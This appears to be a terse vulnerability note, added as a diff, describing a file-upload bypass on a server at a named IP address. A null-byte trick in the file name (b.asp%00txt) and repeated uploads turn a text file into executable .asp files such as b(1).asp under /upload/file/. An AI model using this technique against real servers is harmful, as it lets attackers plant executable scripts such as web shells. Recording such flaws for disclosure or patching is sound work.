@@ -1,0 +1,7 @@
+1.b.asp.txt ----¡÷  b.asp%00txt ----¡÷  b.asp%00txt[URL decode] ----¡÷  b.asp_txt   
+http://61.64.51.253/upload/file/b.asp_txt
+
+2. do action 1 again.
+http://61.64.51.253/upload/file/b(1).asp
+http://61.64.51.253/upload/file/b(2).asp
+......
